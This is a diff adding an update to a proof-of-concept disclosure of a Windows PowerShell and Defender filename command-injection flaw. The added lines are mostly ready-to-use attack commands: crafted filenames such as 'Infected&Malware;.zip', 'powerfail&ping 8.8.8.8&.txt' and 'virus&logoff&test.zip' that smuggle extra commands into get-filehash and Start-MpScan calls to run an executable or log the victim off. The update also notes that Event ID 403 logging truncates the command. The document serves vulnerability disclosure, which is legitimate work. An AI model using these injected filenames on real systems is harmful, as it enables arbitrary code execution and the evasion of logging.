@@ -2,6 +2,26 @@
 Windows PowerShell Filename and Defender Anti-Malware API - Code Execution POC <br>  
 Discovery: John Page (aka hyp3rlinx) 2019 and revisted 2023
 
+Updated Dec 24, 2023 <br>
+
+Bypassing single quotes obstacle in PowerShell for code exec and bonus PS Windows Event log fail! <br>
+Semicolon and friend "&" operator join forces for arbitrary code exec capabilities. <br>
+
+Run some malware:
+C:\Users\gg\Downloads>powershell get-filehash  'Infected&ScanMe;.zip'  -algorithm  md5 <br>
+PE file Malware.exe in the Downloads directory. <br>
+powershell Start-MpScan -Scanpath 'C:\Users\gg\Downloads\Infected&Malware;.zip' <br>
+
+PowerShell Event ID 403, logging fails due to truncating: <br>
+HostApplication=powershell Start-MpScan -Scanpath 'C:\Users\gg\Downloads\Infected <br>
+EngineVersion=5.1.19041.3803 <br>
+
+Call ping cmd <br>
+C:\>powershell get-filehash  'powerfail&ping 8.8.8.8&.txt'  -algorithm  md5 <br>
+
+Logoff victim: <br>
+C:\>powershell Start-MpScan -Scanpath 'virus&logoff&test.zip' <br>
+
 Updated: Dec 7, 2023 added CL and Windows Defender API vector, see below:
 
 Since it still works, I dusted off and made minor improvements: <br> 
